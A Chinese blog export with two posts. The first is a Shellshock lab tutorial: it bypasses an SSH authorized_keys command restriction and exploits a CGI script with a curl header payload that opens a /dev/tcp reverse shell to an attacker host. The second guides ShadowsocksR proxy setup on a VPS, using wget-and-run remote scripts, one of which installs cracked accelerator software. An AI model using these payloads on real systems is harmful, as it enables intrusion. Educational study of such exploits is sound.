<p>公钥身份验证是一种连接到远程SSH服务器的更安全，更可靠的方法。SSH公钥认证依靠非对称密码算法（例如：RSA）来生成一对密钥（私钥和公钥）。</p>
<p>私钥通常存储在客户端计算机上，用于连接到远程系统。</p>
<p>公用密钥与运行SSH服务器的远程系统共享。</p>
<h2 id="生成授权密钥的步骤："><a href="#生成授权密钥的步骤：" class="headerlink" title="生成授权密钥的步骤："></a>生成授权密钥的步骤：</h2><p>登录到攻击者的计算机，然后在终端中键入以下命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen –t rsa</span><br></pre></td></tr></table></figure>

<p>上面的命令是生成公共/私有RSA密钥对。</p>
<p>按下Enter键后，它将提示选择保存这些键的路径。在不输入任何内容的情况下按Enter键，因此保留了默认路径。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh6.png"></li>
</ul>
<p>现在，将提示输入密码。由于出于演示目的而进行操作，因此将其留空。如果在不输入密码的情况下按Enter键，则将生成没有密码保护的私钥。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh7.png"></li>
</ul>
<p>最后，将看到以下屏幕输出。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh8.png"></li>
</ul>
<p>如上图所示，已经生成了私钥和公钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Private key - /Users/srini0x00/.ssh/id_rsa</span><br><span class="line">Public key - /Users/srini0x00/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>可以使用cat命令查看私钥和公钥的内容。下图显示了公钥。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh9.png"></li>
</ul>
<p>现在，是时候将该公钥发送到远程服务器了。可以按照自己喜欢的任何方式进行操作，只是为了节省时间，可以通过SFTP发送它。首先，将其复制到桌面。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh10.png"></li>
</ul>
<p>通过SFTP将公钥发送到远程服务器。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh11.png"></li>
</ul>
<h2 id="3-将授权密钥添加到SSH服务器"><a href="#3-将授权密钥添加到SSH服务器" class="headerlink" title="3.将授权密钥添加到SSH服务器"></a>3.将授权密钥添加到SSH服务器</h2><p>首先，请确保已在服务器上收到公用密钥。<br>为了进行交叉检查，在终端中运行以下命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls –l id_rsa.pub</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh12.png"></li>
</ul>
<p>现在，在“/home/shellshock”中创建一个新目录“.ssh”，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh13.png"></li>
</ul>
<p>将公共密钥放在/.ssh/authorized_keys文件中。可以将id_rsa.pub的内容写到authorized_keys，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh14.png"></li>
</ul>
<p>最后，打开sshd_config文件以确保启用PublickeyAuthentication并正确指定了AuthorizedkeysFile。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh15.png"></li>
</ul>
<p>上面的命令是打开文件“sshd_config”。如下图所示，一切都很完美。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh16.png"></li>
</ul>
<h3 id="从客户端登录"><a href="#从客户端登录" class="headerlink" title="从客户端登录"></a>从客户端登录</h3><p>现在，可以从客户端计算机登录到服务器，如下所示，并且不会提示输入密码。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh17.png"></li>
</ul>
<p>基本上，这就是所谓的SSH公钥身份验证。<br>用户现在甚至可以将其命令作为参数传递给SSH服务器。<br>检查一下如何将“日期”作为参数。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh18.png"></li>
</ul>
<h3 id="是什么使它容易受到攻击？"><a href="#是什么使它容易受到攻击？" class="headerlink" title="是什么使它容易受到攻击？"></a>是什么使它容易受到攻击？</h3><p>如果上述公共密钥身份验证配置为限制用户的预定义命令集，则可能会受到攻击。</p>
<p>这可以使用命令选项来完成。</p>
<p>将使用“authorized_keys”文件中的“command”选项来运行特定的脚本。</p>
<p>出于演示目的，将使用一个非常简单的脚本script.sh，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh19.png"></li>
</ul>
<p>如果用户通过“date”命令作为参数，则上面的脚本仅显示一条消息。如果传递了其他任何内容，它将被执行。</p>
<p>使用以下命令为其授予可执行权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x script.sh</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh20.png"></li>
</ul>
<p>现在，将此脚本的路径添加到“authorized_keys”文件中。如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh21.png"></li>
</ul>
<p>现在，尝试将“date”作为命令行参数传递，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh shellshock@192.168.1.104 date</span><br></pre></td></tr></table></figure>

<p>这将引发一条简单的消息，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh22.png"></li>
</ul>
<p>每当用户尝试通过SSH连接到服务器时，用户提供的参数将保留在SSH_ORIGNAL_COMMAND中。</p>
<p>在执行用户命令之前，将首先执行“authorized_keys”文件中指定的“script.sh”。这样可以更好地控制用户提供的输入。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现在，使用上一篇文章中学到的经典Shellshock漏洞利用。将以下行添加到用于常规连接的实际行中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;() &#123; :;&#125;; date&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh23.png"></li>
</ul>
<p>如上图所示，即使不应执行“date”命令的输出，也会得到它。</p>
<p>与之前的情况不同，在“date”被authorized_keys文件中指定的script.sh阻止的情况下，这次任意命令本身成为了第一个命令，因此获得了打印日期。</p>
<h3 id="利用HTTP-S服务器"><a href="#利用HTTP-S服务器" class="headerlink" title="利用HTTP/S服务器"></a>利用HTTP/S服务器</h3><p>可以使用Shellshock漏洞来破坏运行cgi或任何其他脚本的服务器，这些脚本触发带有环境变量的bash shell，环境变量可以由攻击者控制。</p>
<p>现在，看看如何配置和利用apache服务器。</p>
<h3 id="配置Apache服务器"><a href="#配置Apache服务器" class="headerlink" title="配置Apache服务器"></a>配置Apache服务器</h3><p>在Kali Linux中打开一个终端，然后键入以下命令以启动Apache HTTP服务器。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh24.png"></li>
</ul>
<p>导航到/usr/lib/cgi-bin/目录，然后创建一个新的Shell脚本，如下图所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh25.png"></li>
</ul>
<p>检查是否可以远程访问此文件。</p>
<p>使用一种流行的命令行工具curl，将请求发送到托管在Kali Linux上的远程服务器，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.1.104/cgi-bin/vulnerable.sh</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh26.png"></li>
</ul>
<p>如上图所示，正在获得预期的响应-“bash示例”。</p>
<p>现在，使用标志“-v”来查看客户端与服务器之间的通信期间正在发送和接收的信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl –v http://192.168.1.104/cgi-bin/vulnerable.sh</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh27.png"></li>
</ul>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>如所见，正在尝试点击服务器上的“vulnerable.sh”文件。</p>
<p>通常，当父进程击中bash shell时，将所有标头参数以环境变量的形式传递给子进程。</p>
<p>可以利用此功能来修改和处理恶意请求，以在易受攻击的远程服务器上获取反向shell。</p>
<p>再次使用curl发送带有篡改标头的请求。</p>
<p>但是在此之前，在攻击者的计算机上启动一个新终端，并使用Netcat侦听传入的连接，因为将执行提供反向shell的payload。</p>
<p>下图显示了Netcat在端口4444上进行侦听。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh28.png"></li>
</ul>
<p>现在，如下所示使用curl发送恶意请求。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl –H <span class="string">&#x27;x: () &#123; :;&#125;; /bin/bash –I &gt;&amp; /dev/tcp/192.168.1.102 0&gt;&amp;1&#x27;</span> http://192.168.1.104/cgi-bin/vulnerable.sh</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh29.png"></li>
</ul>
<p>如果想了解在这种情况下请求如何发送到服务器，请使用“–v”选项。</p>
<p>现在，如果返回到启动Netcat的终端，应该能够看到生成了一个反向连接shell，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh30.png"></li>
</ul>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复Shellshock的最简单方法是按照供应商的建议更新bash shell。</p>
<h4 id="Thanks-for-watching-over…"><a href="#Thanks-for-watching-over…" class="headerlink" title="Thanks for watching!!!over…"></a><font color="red"><strong><em>Thanks for watching!!!over…</em></strong></font></h4>]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>shellshock漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>国外的vps自建ssr,附带加速教程</title>
    <url>/2019/02/06/ssr/</url>
    <content><![CDATA[<p><font color="blue"><strong><em>本人愚钝，在学习了github大佬Alvin9999的文章后才懂得自建vps搭建ssr科学上网，本文既是转载Alvin9999的文章，仅作记录方便查阅，附上大佬的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsdmluOTk5OQ==">github地址<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<p>2019.1.18：vultr在2019年1月的最新活动，针对新用户，直接送50美元！</p>
<p>2018.12.9：增加破解版锐速加速教程。</p>
<p>2018.9.1：vultr官方进行了调整，2.5美元套餐只提供ipv6，如果你用不了ipv6，那么你可以买3.5美元的套餐。</p>
<a id="more"></a>

<p><font color="red">不怕被封ip，因为vultr是折算成小时计费，且可以随时删除和开通服务器，新服务器就是新的ip。新开服务器只需要0.01美元，即使你运气非常不好，开了10台服务器才获得没有被墙的ip，总创建服务器成本也只有0.1美元，不到1块钱。开通服务器时，当出现了ip，不要立马去ping或者用xshell去连接，再等5分钟之后，有个缓冲时间。</font></p>
<h3 id="自建ss-ssr教程很简单，整个教程分三步："><a href="#自建ss-ssr教程很简单，整个教程分三步：" class="headerlink" title="自建ss/ssr教程很简单，整个教程分三步："></a>自建ss/ssr教程很简单，整个教程分三步：</h3><p>第一步：购买VPS服务器</p>
<p>第二步：一键部署VPS服务器</p>
<p>第三步：一键加速VPS服务器 (centos6系统选择锐速加速，cenots7选择bbr加速)</p>
<h3 id="第一步：购买VPS服务器"><a href="#第一步：购买VPS服务器" class="headerlink" title="第一步：购买VPS服务器"></a>第一步：购买VPS服务器</h3><p>VPS服务器需要选择国外的，首选国际知名的vultr，速度不错、稳定且性价比高，按小时计费，能够随时开通和删除服务器，新服务器即是新ip。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsdHIuY29tLz9yZWY9Nzc3NzU2NC00Rg==">vultr注册地址<i class="fa fa-external-link-alt"></i></span>（vultr在2019年1月的最新活动，针对新用户，直接送50美元！全球15个服务器位置可选，kvm框架。如果以后这个vultr注册地址被墙了，那么就用翻墙软件打开，或者用ss/ssr免费账号）</p>
<p>虽然是英文界面，但是现在的浏览器都有网页翻译功能，鼠标点击右键，选择网页翻译即可翻译成中文。</p>
<p>注册并邮件激活账号，充值后即可购买服务器。充值方式是支付宝或paypal，使用paypal有银行卡（包括信用卡）即可。<span class="exturl" data-url="aHR0cHM6Ly93d3cucGF5cGFsLmNvbS8=">paypal注册地址<i class="fa fa-external-link-alt"></i></span>（paypal是国际知名的第三方支付服务商，注册一下账号，绑定银行卡即可购买国外商品）</p>
<p>2.5美元/月的服务器配置信息：单核 512M内存 20G SSD硬盘 带宽峰值100M 500G流量/月 (仅ipv6)</p>
<p>3.5美元/月的服务器配置信息：单核 512M内存 20G SSD硬盘 带宽峰值100M 500G流量/月 (推荐)</p>
<p>5美元/月的服务器配置信息： 单核 1G内存 25G SSD硬盘 带宽峰值100M 1000G流量/月</p>
<p>10美元/月的服务器配置信息： 单核 2G内存 40G SSD硬盘 带宽峰值100M 2000G流量/月</p>
<p>20美元/月的服务器配置信息： 2cpu 4G内存 60G SSD硬盘 带宽峰值100M 3000G流量/月</p>
<p>40美元/月的服务器配置信息： 4cpu 8G内存 100G SSD硬盘 带宽峰值100M 4000G流量/月</p>
<p>注意：vultr官方进行了调整，2.5美元套餐只提供ipv6，如果你用不了ipv6，那么你可以买3.5美元的套餐。</p>
<p><font color="red">vultr实际上是折算成小时来计费的，比如服务器是5美元1个月，那么每小时收费为5/30/24=0.0069美元 会自动从账号中扣费，只要保证账号有钱即可。如果你部署的服务器实测后速度不理想，你可以把它删掉（destroy），重新换个地区的服务器来部署，方便且实用。因为新的服务器就是新的ip，所以当ip被墙时这个方法很有用。当ip被墙时，为了保证新开的服务器ip和原先的ip不一样，先开新服务器，开好后再删除旧服务器即可。</font></p>
<p>计费从你开通服务器开始算的，不管你有没有使用，即使服务器处于关机状态仍然会计费，如果你没有开通服务器就不算。比如你今天早上开通了服务器，但你有事情，晚上才部署，那么这段时间是会计费的。同理，如果你早上删掉服务器，第二天才开通新的服务器，那么这段时间是不会计费的。在账号的Billing选项里可以看到账户余额。</p>
<p>温馨提醒：同样的服务器位置，不同的宽带类型和地区所搭建的账号的翻墙速度会不同，这与中国电信、中国联通、中国移动国际出口带宽和线路不同有关，所以以实测为准。可以先选定一个服务器位置来按照教程进行搭建，熟悉搭建方法，当账号搭建完成并进行了bbr加速后，测试下速度自己是否满意，如果满意那就用这个服务器位置的服务器。如果速度不太满意，就一次性开几台不同的服务器位置的服务器，然后按照同样的方法来进行搭建并测试，选择最优的，之后把其它的服务器删掉，按小时计费测试成本可以忽略。</p>
<h3 id="账号充值如图："><a href="#账号充值如图：" class="headerlink" title="账号充值如图："></a>账号充值如图：</h3><p><img src="/images/ssr1.jpg" alt="ssr"></p>
<h3 id="开通服务器步骤如图："><a href="#开通服务器步骤如图：" class="headerlink" title="开通服务器步骤如图："></a>开通服务器步骤如图：</h3><p><img src="/images/ssr2.jpg" alt="ssr"></p>
<p>点击图中的CentOS几个字，会弹出centos6，然后选中centos6！<br>接下来这一步是开启vps的ipv6 ip，选填项。如果你的电脑系统可以用ipv6，那么可以勾选此项。大多数用户没有这个需求，但有一些用户可能会用到，所以补充了这部分内容。</p>
<p><img src="/images/ssr3.jpg" alt="ssr"></p>
<p>开通服务器时，当出现了ip，不要立马去ping或者用xshell去连接，再等5分钟之后，有个缓冲时间。完成购买后，找到系统的密码记下来，部署服务器时需要用到。vps系统（推荐centos6）的密码获取方法如下图：</p>
<p><img src="/images/ssr4.jpg" alt="ssr"></p>
<p>如果你开启了vps的ipv6，那么在后台的settings选项可以找到服务器的ipv6 ip。在部署SSR账号时，你用ipv6 ip就行。整个部署及使用过程中，记得把电脑系统开启ipv6喔。</p>
<h3 id="删掉服务器步骤如下图："><a href="#删掉服务器步骤如下图：" class="headerlink" title="删掉服务器步骤如下图："></a>删掉服务器步骤如下图：</h3><p><img src="/images/ssr5.jpg" alt="ssr"></p>
<p>一个被墙ip的vps被删掉后，其ip并不会消失，会随机分配给下一个在这个服务器位置新建服务器的人，这就是为什么开新服务器会有一定几率开到被墙的ip。被墙是指在国内地区无法ping通服务器，但在国外是可以ping通的，vultr是面向全球服务，如果这个被墙ip被国外的人开到了，它是可以被正常使用的，半年或1年后这个被墙的ip可能会被国内防火墙解封，那么这就是一个良性循环。</p>
<h3 id="第二步：部署VPS服务器"><a href="#第二步：部署VPS服务器" class="headerlink" title="第二步：部署VPS服务器"></a>第二步：部署VPS服务器</h3><p>购买服务器后，需要部署一下。因为你买的是虚拟东西，而且又远在国外，我们需要一个叫juiceSSH的手机软件来远程部署。</p>
<p>部署方法我就不多说了，直接填上账号密码后连接即可。</p>
<p>连接成功后开始复制粘贴以下代码，开始自动部署</p>
<p>CentOS6/Debian6/Ubuntu14 ShadowsocksR一键部署管理脚本（2018.11.21更新）：</p>
<p>脚本一（2018.11.20更新）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</span><br></pre></td></tr></table></figure>

<p>备用脚本二（2018.11.21更新）</p>
<p>如果上面的脚本暂时用不了，可以用下面的备用脚本，备用脚本没有单独做图文教程，自己摸索下就会了。备用脚本卸载命令：./shadowsocksR.sh uninstall</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocksR.sh</span><br><span class="line"></span><br><span class="line">./shadowsocksR.sh 2&gt;&amp;1 | tee shadowsocksR.log</span><br></pre></td></tr></table></figure>

<p>复制上面的脚本一代码到VPS服务器里，复制代码用鼠标右键的复制，然后在vps里面右键粘贴进去，因为ctrl+c和ctrl+v无效。接着按回车键，脚本会自动安装，以后只需要运行这个快捷命令就可以出现下图的界面进行设置，快捷管理命令为：bash ssr.sh</p>
<p>输入数字1来安装SSR服务端。如果输入1后不能进入下一步，那么请退出xshell，重新连接vps服务器，然后输入快捷管理命令bash ssr.sh 再尝试。</p>
<p>依次输入自己想设置的端口和密码 (密码建议用复杂点的字母组合，端口号为40-65535之间的数字)，回车键用于确认</p>
<p>注：关于端口的设置，总的网络总端口有6万多个，理论上可以任意设置，但不要以0开头！但是有的地区需要设置特殊的端口才有效，一些特殊的端口比如80、143、443、1433、3306、3389、8080。</p>
<p>选择想设置的加密方式，比如10，按回车键确认</p>
<p>接下来是选择协议插件，</p>
<p>提示你是否选择兼容原版，这里的原版指的是SS客户端（SS客户端没有协议和混淆的选项），可以根据需求进行选择，演示选择y</p>
<p>之后进行混淆插件的设置。</p>
<p>注意：如果协议是origin，那么混淆也必须是plain；如果协议不是origin，那么混淆可以是任意的。有的地区需要把混淆设置成plain才好用。因为混淆不总是有效果，要看各地区的策略，有时候不混淆（plain）或者（origin和plain一起使用），让其看起来像随机数据更好。（特别注意：tls 1.2_ticket_auth容易受到干扰！请选择除tls开头以外的其它混淆！！！）</p>
<p>进行混淆插件的设置后，会依次提示你对设备数、单线程限速和端口总限速进行设置，默认值是不进行限制，个人使用的话，选择默认即可，即直接敲回车键。</p>
<p>注意：关于限制设备数，这个协议必须是非原版且不兼容原版才有效，也就是必须使用SSR协议的情况下，才有效！</p>
<p>之后代码就正式自动部署了，提示你下载文件，输入：y</p>
<p>耐心等待一会，出现下面的界面即部署完成：</p>
<p><img src="/images/ssr6.jpg" alt="ssr"></p>
<p>根据上图就可以看到自己设置的SSR账号信息，包括IP、端口、密码、加密方式、协议插件、混淆插件，这些信息需要填入你的SSR客户端。如果之后想修改账号信息，直接输入快捷管理命令：bash ssr.sh 进入管理界面，选择相应的数字来进行一键修改。</p>
<h3 id="脚本演示结束。"><a href="#脚本演示结束。" class="headerlink" title="脚本演示结束。"></a>脚本演示结束。</h3><p>此脚本是开机自动启动，部署一次即可。最后可以重启服务器确保部署生效（一般情况不重启也可以）。重启需要在命令栏里输入reboot ，输入命令后稍微等待一会服务器就会自动重启，一般重启过程需要2～5分钟，重启过程中Xshell会自动断开连接，等VPS重启好后才可以用Xshell软件进行连接。如果部署过程中卡在某个位置超过10分钟，可以用xshell软件断开，然后重新连接你的ip，再复制代码进行部署。</p>
<h3 id="第三步：一键加速VPS服务器"><a href="#第三步：一键加速VPS服务器" class="headerlink" title="第三步：一键加速VPS服务器"></a>第三步：一键加速VPS服务器</h3><p>2018年12月9日增加破解版锐速加速教程。</p>
<p>【破解版锐速加速教程】</p>
<p>此加速教程为破解版锐速加速,Vultr的服务器centos6系统官方进行了更新，导致目前不支持BBR的部署，但锐速应该是可以部署的，故增加了此部署脚本，加速后对速度的提升很明显，所以推荐部署加速脚本。该加速方法是开机自动启动，部署一次就可以了。</p>
<h3 id="第一步，先更换服务器内核："><a href="#第一步，先更换服务器内核：" class="headerlink" title="第一步，先更换服务器内核："></a>第一步，先更换服务器内核：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://blog.asuhu.com/sh/ruisu.sh &amp;&amp; bash ruisu.sh</span><br></pre></td></tr></table></figure>

<p>不动的时候敲回车键</p>
<p>完成后会重启，2分钟后重新连接服务器，连上后开始第二步的操作。</p>
<h3 id="第二步，一键安装锐速："><a href="#第二步，一键安装锐速：" class="headerlink" title="第二步，一键安装锐速："></a>第二步，一键安装锐速：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh &amp;&amp; bash serverspeeder-all.sh</span><br></pre></td></tr></table></figure>

<p>卸载加速代码命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr -i /serverspeeder/etc/apx* &amp;&amp; /serverspeeder/bin/serverSpeeder.sh uninstall -f</span><br></pre></td></tr></table></figure>

<p>但有些内核是不适合的，部署过程中需要手动选择推荐的，当部署时出现以下字样：</p>
<p><img src="/images/ssr7.jpg" alt="ssr"></p>
<p>提示没有完全匹配的内核,随便选一个内核就行,按照提示来输入数字,按回车键即可</p>
<p>锐速安装成功标志如下：</p>
<p><img src="/images/ssr8.jpg" alt="ssr"></p>
<p>出现running字样即可!</p>
<h3 id="【谷歌BBR加速教程】"><a href="#【谷歌BBR加速教程】" class="headerlink" title="【谷歌BBR加速教程】"></a>【谷歌BBR加速教程】</h3><p>vultr服务器的centos6不支持bbr加速，但centos7系统支持bbr加速，所以如果你想用bbr加速教程，vps操作系统需要选择centos7。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh</span><br><span class="line"></span><br><span class="line">chmod +x bbr.sh</span><br><span class="line"></span><br><span class="line">./bbr.sh</span><br></pre></td></tr></table></figure>

<p>把上面整个代码复制后粘贴进去，不动的时候按回车，然后耐心等待，最后重启vps服务器即可。</p>
<p>演示开始，如图：</p>
<p>复制并粘贴代码后，按回车键确认</p>
<p>按任意键继续部署</p>
<p><img src="/images/ssr9.jpg" alt="ssr"></p>
<p>最后输入y重启服务器，如果输入y提示command not found ，接着输入reboot来重启服务器，确保加速生效，bbr加速脚本是开机自动启动，装一次就可以了。</p>
<p>服务器重启成功并重新连接服务器后，输入命令lsmod | grep bbr 如果出现tcp_bbr字样表示bbr已安装并启动成功。</p>
<p>注意：根据反馈，少部分人安装bbr脚本并重启后，几分钟过去了，发现xshell无法连接服务器且服务器ip无法ping通。解决方法是：开新服务器或者重装系统，然后先安装bbr脚本再安装ssr脚本，或者改用锐速加速脚本。</p>
<h3 id="【SSR客户端下载】"><a href="#【SSR客户端下载】" class="headerlink" title="【SSR客户端下载】"></a>【SSR客户端下载】</h3><p>第一次电脑系统使用SSR/SS客户端时，如果提示你需要安装NET Framework 4.0，网上搜一下这个东西，安装一下即可。NET Framework 4.0是SSR/SS的运行库，没有这个SSR/SS客户端无法正常运行。有的电脑系统可能会自带NET Framework 4.0。</p>
<p>Windows SSR客户端 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzci1iYWNrdXAvc2hhZG93c29ja3NyLWNzaGFycC9yZWxlYXNlcw==">下载地址<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ub2ZpbGUuaW8vZi82Sm03V0pDeU9Wdi9TaGFkb3dzb2Nrc1ItNC43LjAtd2luLjd6">备用下载地址<i class="fa fa-external-link-alt"></i></span></p>
<p>MAC SSR客户端 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzci1iYWNrdXAvU2hhZG93c29ja3NYLU5HL3JlbGVhc2Vz">下载地址<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ub2ZpbGUuaW8vZi9qZ01XRndDQm9uVSNhYjBkM2MzYjZhYzU0NDgy">备用下载地址<i class="fa fa-external-link-alt"></i></span></p>
<p>Linux客户端一键安装配置使用脚本(使用方法见注释) 或者采用图形界面的linux ssr客户端</p>
<p>安卓SSR客户端 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzci1iYWNrdXAvc2hhZG93c29ja3NyLWFuZHJvaWQvcmVsZWFzZXMvZG93bmxvYWQvMy40LjAuOC9zaGFkb3dzb2Nrc3ItcmVsZWFzZS5hcGs=">下载地址<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ub2ZpbGUuaW8vZi9ydlRKb2owaDVHQy9zaGFkb3dzb2Nrc3ItcmVsZWFzZS5hcGs=">备用下载地址<i class="fa fa-external-link-alt"></i></span></p>
<p>苹果手机SSR客户端：Potatso Lite、Potatso、shadowrocket都可以作为SSR客户端，但这些软件目前已经在国内的app商店下架，可以用美区的appid账号来下载。但是，如果你配置的SSR账号兼容SS客户端，或者协议选择origin且混淆选择plain，那么你可以选择苹果SS客户端软件（即协议和混淆可以不填），APP商店里面有很多，比如：SuperRocket、ScanWingy等。</p>
<p>有了账号后，打开SSR客户端，填上信息,即可使用。</p>
<h4 id="常见问题参考解决方法："><a href="#常见问题参考解决方法：" class="headerlink" title="常见问题参考解决方法："></a>常见问题参考解决方法：</h4><p>1、用了一段时间发现ssr账号用不了了？</p>
<p>首先ping一下自己的ip，看看能不能ping的通，ping不通那么就是ip被墙了，ip被墙时，xshell也会连接不上服务器，遇到这种情况重新部署一个新的服务器，新的服务器就是新的ip。关于怎么ping ip的方法，可以自行网上搜索，或者用xshell软件连接服务器来判断，连不上即是被墙了。vultr开通和删除服务器非常方便，新服务器即新ip，大多数vps服务商都没有这样的服务，一般的vps服务商可能会提供免费更换1次ip的服务。</p>
<p>2、刚搭建好的ssr账号，ip能ping通，但是还是用不了？</p>
<p>首选排除杀毒软件的干扰，尤其是国产杀毒软件，比如360安全卫生、360杀毒软件、腾讯管家、金山卫生等。这些东西很容易干扰翻墙上网，如果你的电脑安装了这样的东西，建议至少翻墙时别用，最好卸载。其次，检查下SSR信息是否填写正确。浏览器的代理方式是否是ssr代理，即（HTTP）127.0.0.1 和1080。如果以上条件都排除，还是用不了，那么可以更换端口、加密方式、协议、混淆，或者更换服务器位置。另外，如果你的vps服务器配置的是SSR账号，即有协议和混淆且没有兼容原版(SS版），那么你必须使用SSSR客户端来使用账号，因为SS客户端没有填写协议和混淆的选项。</p>
<p>3、有的地区需要把混淆参数设置成plain才好用。因为混淆不总是有效果，要看各地区的策略，有时候不混淆（plain）让其看起来像随机数据更好。</p>
<p>4、电脑能用但手机用不了？</p>
<p>如果你的手机用的是SS客户端，SS客户端没有填协议和混淆的地方，如果你部署的协议和混淆的时候没有选择兼容原版（SS版），因此手机是用不了的。这个时候你把协议弄成兼容原版、混淆也设置成兼容原版即可。或者直接将协议设置成origin且混淆设置成plain。</p>
<p>5、vps的服务器操作系统不要用的太高，太高可能会因为系统的防火墙问题导致搭建的SSR账号连不上。如果某个系统不好用，可以选择其它的系统来尝试。</p>
